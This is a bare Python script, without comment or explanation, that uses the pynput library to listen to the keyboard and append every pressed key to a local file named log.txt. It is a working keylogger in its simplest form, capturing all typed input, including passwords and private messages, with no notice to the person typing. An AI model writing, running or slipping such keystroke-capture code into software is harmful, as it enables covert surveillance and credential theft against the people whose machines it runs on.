from pynput.keyboard import Key, Listener

def on_press(key):
    key = str(key)
    with open("log.txt", "a") as f:
        f.write(key + "\n")

with Listener(on_press=on_press) as listener:
    listener.join()

